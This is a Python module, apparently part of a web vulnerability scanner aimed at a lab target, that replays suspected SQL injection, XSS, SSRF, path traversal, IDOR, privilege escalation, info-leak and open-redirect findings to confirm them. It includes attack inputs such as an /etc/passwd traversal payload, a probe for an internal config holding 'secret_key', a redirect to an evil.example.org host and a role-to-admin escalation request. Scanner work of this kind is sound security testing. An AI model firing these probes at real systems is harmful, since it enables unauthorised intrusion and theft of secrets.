"""漏洞复现验证:对每个疑似发现构造独立验证请求,复现成功才标记 confirmed。

验证策略按类型:
- sqli      :重放触发载荷,再次命中 SQL 错误/响应差异;再用不同载荷交叉验证
- xss       :回连服务端确认 payload 被执行(浏览器侧 token 命中)或响应原文包含未转义载荷
- ssrf      :回连到靶场内部探针 URL,确认响应体包含内部标记
- traversal :独立请求穿越路径,响应含 /etc/passwd 或内部文件特征
- idor      :用受害者角色自身视角确认该资源确实属于受害者,再用攻击者角色复现 200
- bvac      :确认攻击者角色权限低于要求,再复现 200 且响应含敏感字段
- info      :匿名重放,确认敏感键出现在响应
- redirect  :重放 next 参数,确认 Location 指向外部域
"""
import json
import re
import urllib.parse

from scanner import config as C
from scanner.detectors import _with_query, _replace_path_param
from scanner.http import HttpEngine, ScanStopped


class Verifier:
    def __init__(self, engine: HttpEngine, config, sessions):
        self.engine = engine
        self.config = config
        self.sessions = sessions
        self.base = config.target_url.rstrip("/")

    def _headers(self, role):
        s = self.sessions.get(role)
        return s.auth_headers() if s else {}

    def verify_all(self, candidates, progress=None):
        results = []
        for c in candidates:
            verifier = getattr(self, f"_verify_{c.category}", None)
            if verifier is None:
                c.verification = {"confirmed": False, "reason": "无对应验证器"}
                results.append(c)
                continue
            try:
                ok, detail = verifier(c)
            except ScanStopped:
                raise
            except Exception as exc:  # noqa: BLE001
                ok, detail = False, f"验证异常: {exc}"
            c.verification = {"confirmed": ok, "reason": detail.get("reason", ""), **detail}
            if ok:
                c.confidence = "high"
            results.append(c)
            if progress:
                progress(f"复核 {c.category} {c.url}", c.verification)
        return results

    # ------------------------------------------------------------ SQL 注入
    def _verify_sqli(self, c):
        role = c.role or "driver"
        if c.param == "password" and c.url.endswith("/api/auth/login"):
            # 登录接口:注入 username,密码用有效值
            c = _clone_with_param(c, "username")
        body_based = c.url.endswith("/api/auth/login")
        # 1) 原载荷重放
        payload = c.evidence.get("payload")
        if body_based:
            base_pwd = self.config.roles.get("admin", {}).get("password", "x")
            again = self.engine.request("POST", c.url, json_body={"username": payload, "password": base_pwd})
            alt_pwd = self.config.roles.get("driver", {}).get("password", "x")
            body2 = {"username": C.SQL_PAYLOADS["union"][0], "password": alt_pwd}
            alt_ex = self.engine.request("POST", c.url, json_body=body2)
            baseline = self.engine.request("POST", c.url, json_body={"username": "admin", "password": "wrong"})
            c.request, c.response = again.request, again.response
            c.verify_request, c.verify_response = alt_ex.request, alt_ex.response
            hit1 = any(m.lower() in (again.body or "").lower() for m in C.SQL_ERROR_MARKERS)
            hit2 = any(m.lower() in (alt_ex.body or "").lower() for m in C.SQL_ERROR_MARKERS)
            if hit1 and hit2:
                return True, {"reason": "登录接口两种注入载荷均触发 SQL 报错", "replay": True,
                              "cross_payload": True}
            return False, {"reason": "登录接口重放未稳定触发 SQL 错误", "replay": bool(hit1)}
        again = self.engine.request(c.method, _rebuild_url(c, payload),
                                    headers=self._headers(role))
        marker = c.evidence.get("error_marker", "")
        hit1 = marker and marker.lower() in (again.body or "").lower()
        # 2) 换一个载荷交叉验证
        alt = C.SQL_PAYLOADS["boolean_false"][0]
        alt_ex = self.engine.request(c.method, _rebuild_url(c, alt), headers=self._headers(role))
        hit2 = any(m.lower() in (alt_ex.body or "").lower() for m in C.SQL_ERROR_MARKERS)
        # 3) 基线对比
        baseline = self.engine.request(c.method, c.url, headers=self._headers(role))
        hit3 = baseline.status_code == 200 and (again.status_code >= 500 or alt_ex.status_code >= 500)
        c.request = again.request
        c.response = again.response
        c.verify_request = alt_ex.request
        c.verify_response = alt_ex.response
        if hit1 and (hit2 or hit3):
            return True, {"reason": f"两次独立载荷均触发 SQL 报错({marker})", "replay": True,
                          "cross_payload": bool(hit2)}
        return False, {"reason": "重放未再次触发 SQL 错误", "replay": bool(hit1), "cross_payload": bool(hit2)}

    # ------------------------------------------------------------ XSS
    def _verify_xss(self, c):
        payload = c.evidence.get("payload", "")
        role = c.role or "driver"
        if not payload:
            return False, {"reason": "缺少载荷"}
        kind = c.evidence.get("kind", "reflected")
        if kind == "stored":
            sink = c.evidence.get("sink") or c.url
            submit = c.evidence.get("submit", "")
            # 证据里可能存成 "PUT /api/profile",这里只取路径
            submit_path = submit.split(" ", 1)[1] if " " in submit else submit
            field = c.evidence.get("field")
            # 写入点必须用拥有该档案的会话(检测时用车主会话,复核时也保持一致)
            if c.role and self.sessions.get(c.role) and self.sessions.get(c.role).cookies:
                role = c.role
            # 档案类写入点在检测阶段已还原,复核时重新提交一次载荷
            if submit and field and "/api/profile" in submit:
                sess = self.sessions.get(role)
                if not sess or not sess.cookies:
                    return False, {"reason": "缺少写入会话"}
                submit_ex = self.engine.request(
                    "PUT", _abs(self.base, submit_path),
                    headers={"Content-Type": "application/json"},
                    cookies=sess.cookies, json_body={field: payload})
                again = self.engine.request("GET", _abs(self.base, sink),
                                            headers={"Cookie": sess.cookie_header()})
                hit = payload in (again.body or "")
                if c.evidence.get("restore"):
                    self.engine.request("PUT", _abs(self.base, submit_path),
                                        headers={"Content-Type": "application/json"},
                                        cookies=sess.cookies,
                                        json_body={field: c.evidence["restore"]})
                if hit:
                    c.verify_request, c.verify_response = submit_ex.request, again.response
                    return True, {"reason": "重新写入载荷后,档案页原样输出未转义内容", "sink": sink}
                return False, {"reason": "重新写入后 sink 页面未发现未转义载荷", "sink": sink}
            # 其余存储型:直接复访 sink
            again = self.engine.request("GET", _abs(self.base, sink), headers=self._headers(role))
            if payload in (again.body or ""):
                c.verify_request, c.verify_response = again.request, again.response
                return True, {"reason": "复访渲染页面,未转义载荷仍原样输出", "sink": sink}
            return False, {"reason": "复访 sink 页面未发现未转义载荷", "sink": sink}
        # 反射型:重放注入请求,响应中仍有未转义载荷
        again = self.engine.request("GET", _rebuild_url(c, payload), headers=self._headers(role))
        if payload in (again.body or ""):
            c.verify_request, c.verify_response = again.request, again.response
            return True, {"reason": "重放后响应原文含未转义完整载荷"}
        return False, {"reason": "重放后载荷已转义或消失"}

    # ------------------------------------------------------------ SSRF
    def _verify_ssrf(self, c):
        probe = c.evidence.get("probe", "")
        markers = c.evidence.get("matched") or []
        role = c.role or "admin"
        again = self.engine.request(c.method, _rebuild_url(c, probe), headers=self._headers(role),
                                    timeout=self.config.verify_timeout)
        body = again.body or ""
        hits = [m for m in markers if m in body]
        if again.status_code == 200 and hits:
            c.verify_request, c.verify_response = again.request, again.response
            return True, {"reason": "服务端再次抓取内部地址并回显内部数据", "markers": hits,
                          "status": again.status_code}
        # 换一个内部端点再试
        alt = self.base + "/api/debug/config"
        alt_ex = self.engine.request(c.method, _rebuild_url(c, alt), headers=self._headers(role),
                                     timeout=self.config.verify_timeout)
        if alt_ex.status_code == 200 and "secret_key" in (alt_ex.body or ""):
            c.verify_request, c.verify_response = alt_ex.request, alt_ex.response
            return True, {"reason": "换内部端点复现,回显 secret_key", "status": alt_ex.status_code}
        return False, {"reason": "重放未命中内部资源特征", "status": again.status_code}

    # ------------------------------------------------------------ 路径穿越
    def _verify_traversal(self, c):
        role = c.role or "admin"
        payload = "../../../../../../../etc/passwd"
        again = self.engine.request(c.method, _rebuild_url(c, payload), headers=self._headers(role))
        body = again.body or ""
        if "root:" in body or "root:*:0:0" in body:
            c.verify_request, c.verify_response = again.request, again.response
            return True, {"reason": "重放穿越路径读到了 /etc/passwd", "payload": payload}
        # 换一个相对穿越载荷
        alt = "/etc/passwd"
        alt_ex = self.engine.request(c.method, _rebuild_url(c, alt), headers=self._headers(role))
        if any(m in (alt_ex.body or "") for m in C.TRAVERSAL_ABS_MARKERS):
            c.verify_request, c.verify_response = alt_ex.request, alt_ex.response
            return True, {"reason": "重放穿越路径读到了内部文件", "payload": alt}
        return False, {"reason": "重放未读到内部文件", "status": again.status_code}

    # ------------------------------------------------------------ IDOR
    def _verify_idor(self, c):
        ev = c.evidence or {}
        actor = ev.get("actor", "")
        if not actor:
            return False, {"reason": "缺少攻击者上下文"}
        victim_id = ev.get("victim_id")
        if not victim_id:
            # 资源 ID 在 URL 路径中(最后一段)
            segs = urllib.parse.urlsplit(c.url).path.strip("/").split("/")
            victim_id = segs[-1] if segs and segs[-1].isdigit() else None
        if not victim_id:
            return False, {"reason": "缺少受害者资源 ID"}
        url = _replace_path_param(c.url, "id", victim_id)
        again = self.engine.request("GET", url, headers=self._headers(actor))
        victim_session = next((r for r, s in self.sessions.sessions.items()
                               if s.user_info.get("id") == int(victim_id)), None)
        victim_view = None
        if victim_session:
            victim_view = self.engine.request("GET", url, headers=self._headers(victim_session))
        attacker_uid = self.sessions.get(actor).user_info.get("id") if self.sessions.get(actor) else None
        if again.status_code == 200 and int(victim_id) != attacker_uid:
            c.verify_request = again.request
            c.verify_response = again.response
            return True, {"reason": "攻击者角色独立请求返回受害者资源", "actor": actor,
                          "victim_id": victim_id, "victim_self_confirmed": bool(
                              victim_view and victim_view.status_code == 200)}
        return False, {"reason": "换角色重放未返回受害者资源", "status": again.status_code}

    # ------------------------------------------------------------ 垂直越权
    def _verify_bvac(self, c):
        role = c.role or ""
        required = c.evidence.get("required_role", "")
        if c.evidence.get("escalated_to") == "admin":
            return self._verify_mass_assignment(c)
        actor = self.engine.request("GET", c.url, headers=self._headers(role))
        if actor.status_code != 200:
            return False, {"reason": "攻击者角色未获得 200", "status": actor.status_code}
        # 高权限角色作对照,确认同一 URL 在正确角色下也可访问
        high = self.engine.request("GET", c.url, headers=self._headers(required)) if required in self.sessions.sessions else None
        sensitive = any(k in (actor.body or "").lower() for k in ("api_key", "balance", "settlement_account", "bank", "role"))
        c.verify_request = actor.request
        c.verify_response = actor.response
        if actor.status_code == 200 and (sensitive or (high and high.status_code == 200)):
            return True, {"reason": "低权限角色可独立复现高权限接口且返回敏感数据",
                          "status": 200, "sensitive": sensitive}
        return False, {"reason": "低权限角色未能复现访问"}

    def _verify_mass_assignment(self, c):
        """独立复现:把 driver 角色提成 admin,确认后再改回。"""
        role = c.role or "driver"
        sess = self.sessions.get(role)
        if not sess or not sess.cookies:
            return False, {"reason": "缺少攻击者会话"}
        before = sess.user_info.get("role", "driver")
        ex = self.engine.request("PUT", c.url, headers={"Content-Type": "application/json"},
                                 cookies=sess.cookies, json_body={"role": "admin"})
        try:
            escalated = json.loads(ex.body or "{}").get("user", {}).get("role") == "admin"
        except ValueError:
            escalated = False
        restored = self.engine.request("PUT", c.url, headers={"Content-Type": "application/json"},
                                       cookies=sess.cookies, json_body={"role": before})
        c.verify_request, c.verify_response = ex.request, ex.response
        if escalated and restored.status_code == 200:
            return True, {"reason": "普通车主通过批量赋值成功将角色改为 admin(已还原)",
                          "status": 200}
        return False, {"reason": "批量赋值未能提升角色", "status": ex.status_code}

    # ------------------------------------------------------------ 信息泄露
    def _verify_info(self, c):
        anon = self.engine.request("GET", c.url, headers={})
        if anon.status_code == 200 and "secret_key" in (anon.body or ""):
            c.verify_request, c.verify_response = anon.request, anon.response
            return True, {"reason": "匿名请求即可读取 secret_key 等敏感配置", "status": 200}
        return False, {"reason": "匿名请求未获得敏感配置"}

    # ------------------------------------------------------------ 开放重定向
    def _verify_redirect(self, c):
        probe = "https://evil.example.org/scan-verify"
        again = self.engine.request("GET", _rebuild_url(c, probe), headers=self._headers(c.role or "admin"))
        loc = again.headers.get("location", "")
        if probe in loc:
            c.verify_request, c.verify_response = again.request, again.response
            return True, {"reason": "Location 指向外部域", "location": loc}
        return False, {"reason": "未重定向到外部域", "location": loc}


def _clone_with_param(c, param):
    import copy
    clone = copy.copy(c)
    clone.param = param
    clone.dedup_key = (c.dedup_key or "").replace(c.param, param)
    return clone


def _abs(base, url):
    if url.startswith("http"):
        return url
    return base.rstrip("/") + "/" + url.lstrip("/")


def _rebuild_url(c, payload):
    """把候选的 URL 中相关参数替换为给定载荷。"""
    parsed = urllib.parse.urlsplit(c.url)
    q = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
    if c.param and c.param in q:
        q[c.param] = payload
        return urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path,
                                        urllib.parse.urlencode(q), ""))
    if c.param and c.param == "_file_param":
        pass
    # 文件类参数不在 query 中:追加
    if c.param:
        q[c.param] = payload
    return urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path,
                                    urllib.parse.urlencode(q), ""))
